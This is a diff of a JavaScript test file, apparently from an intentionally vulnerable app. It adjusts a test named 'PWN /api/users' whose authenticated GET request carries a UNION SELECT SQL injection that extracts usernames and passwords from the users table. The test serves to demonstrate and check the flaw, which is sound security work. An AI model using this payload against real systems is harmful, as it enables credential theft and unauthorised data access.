@@ -77,7 +77,7 @@ describe("Authenticated tests", function () {
 
   it("PWN /api/users: SQL injection extract user password", function (done) {
     chai.request(app)
-      .get("/api/users/type/2 UNION SELECT 1,username || '-' || password,1,1 FROM users")
+      .get("/api/users/type/2 UNION SELECT username || '-' || password, username FROM users")
       .set({ Authorization: `Bearer ${accessToken}` })
       .end(function (err, res) {
         res.should.have.status(200)
